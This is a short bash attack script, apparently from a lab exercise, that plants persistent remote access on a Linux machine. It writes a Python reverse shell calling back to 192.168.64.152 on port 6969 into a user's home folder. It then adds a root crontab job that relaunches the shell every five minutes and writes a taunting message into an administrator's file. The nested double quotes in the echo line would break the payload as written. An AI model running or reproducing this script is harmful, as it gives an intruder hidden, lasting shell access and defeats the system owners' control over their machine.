#!/bin/bash
#Place rev shell in sus.py
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.152",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")" > /home/user1/sus.py

#Add rev shell to crontab
echo "*/5 * * * * /usr/bin/python3 /home/user1/sus.py" | sudo crontab -


#Adds text to admins donttouch.txt
sudo bash -c 'echo "I am in, you cannot find me" > /home/admin1/donttouch.txt'